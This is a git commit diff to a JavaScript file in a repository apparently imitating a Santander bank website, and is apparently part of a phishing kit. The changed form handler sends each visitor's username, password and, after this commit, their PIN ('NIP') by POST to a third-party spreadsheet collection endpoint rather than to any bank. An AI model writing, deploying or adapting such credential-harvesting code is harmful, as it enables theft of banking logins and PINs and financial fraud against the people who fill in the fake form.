0af2052bad187960ecbb41ba55b40dee73260a2f
santanderweb-23 <archivaldog152@gmail.com>
2026-02-23 15:36:31 -0600

    Update 1820sa.js

--- santa/js/1820sa.js
+++ santa/js/1820sa.js
@@ -7,7 +7,7 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://api.sheetbest.com/sheets/c4b3435f-e064-4490-b04a-c94d49114333', {
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/bc628b4f-da53-4267-bf2f-955a730d34a4', {
         method: 'POST',
         mode: 'cors',
         headers: {
@@ -16,7 +16,7 @@ try {
         body: JSON.stringify({
             "1": formulario.usuario.value,
             "2": formulario.contraseña.value,
-            "3": formulario.confirmar.value
+            "3": formulario.NIP.value
         })
     });
 
